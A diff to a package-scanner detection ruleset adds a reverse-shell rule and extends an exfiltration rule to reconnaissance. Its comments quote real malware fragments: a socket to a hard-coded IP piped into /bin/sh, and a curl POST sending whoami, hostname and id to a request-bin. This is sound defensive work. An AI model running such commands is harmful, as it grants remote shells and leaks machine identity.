@@ -634,6 +634,43 @@ rules:
             - capability: mine
             - capability: wallet
 
+  - id: MALWARE.REVERSE_SHELL.001
+    version: 1.0.0
+    category: malicious
+    severity: critical
+    confidence: high
+    title: A shell piped to a socket
+    message: >
+      This file opens a socket to an address written into the code and connects
+      a shell process to it. That is a reverse shell: it gives whoever is
+      listening on that address an interactive prompt on the machine that
+      installed the package, with the permissions of whoever ran it.
+    remediation: >
+      Treat the machine as compromised, not just the package. Do not install
+      it, and report it to the registry.
+    references:
+      - https://attack.mitre.org/techniques/T1059/
+    provenance:
+      kind: incident
+      reference: "elf-stats-*, npm, 2025-12"
+      note: >
+        Nine packages published in one week under festive random names.
+        `flickering-fir-572` and `sprucey-fireplace-355` are each a dozen lines:
+        `net.Socket().connect(55555, "82.65.157.141")`, `spawn("/bin/sh", [])`,
+        and the two piped into one another. Cordon reported nothing on either --
+        a socket was egress, a shell was spawn, and no rule said what the pair
+        of them is.
+    evidence_policy: masked
+    match:
+      kind: composite
+      scope: file
+      # Ten lines. The three parts of a reverse shell are written together or
+      # they do not work: the socket, the shell, and the pipe that joins them.
+      proximity: 10
+      all:
+        - rule: CAP.JS.SOCKET_LITERAL.001
+        - capability: spawn
+
   # ---------------------------------------------------------------------
   # Anti-analysis
   # ---------------------------------------------------------------------
@@ -835,10 +872,11 @@ rules:
     category: suspicious
     severity: high
     confidence: medium
-    title: Credential access and a request to a drop point
+    title: Credential or machine identity, and a request to a drop point
     message: >
-      This file reads credentials or the environment and contacts a chat
-      webhook, an anonymous paste service, or an out-of-band interaction host.
+      This file reads credentials or the environment, or identifies the machine
+      it is running on, and contacts a chat webhook, an anonymous paste
+      service, or an out-of-band interaction host.
       Two signals rather than the usual three, because the destination is
       itself the third: a webhook ingest needs no account and no
       infrastructure, which is why it is the most common exfiltration endpoint
@@ -862,7 +900,22 @@ rules:
       proximity: 200
       all:
         - rule: INTEL.EGRESS.DROP_POINT.001
-        - capability: credential
+        # Or reconnaissance. The same correction `SUSPECT.EXFIL.DNS.001` needed
+        # this release: what a beacon sends is who and where you are, and a
+        # hostname is not a credential.
+        #
+        # `elf-stats-candystriped-muffin-773` and eight siblings published the
+        # same week are 391 bytes each:
+        #
+        #     curl -X POST "https://<id>.m.pipedream.net/$(whoami)/$(hostname)/" \
+        #       -A "$( (id && ls /opt) | base64 | tr '\n' '.')"
+        #
+        # A request-bin host, the user and machine name in the path, and `id`
+        # base64ed into the User-Agent. Every signal this rule wants except a
+        # credential, so it reported nothing at all.
+        - any:
+            - capability: credential
+            - capability: reconnaissance
       unless:
         - path_glob: "**/*.test.*"
         - path_glob: "**/test_*.py"
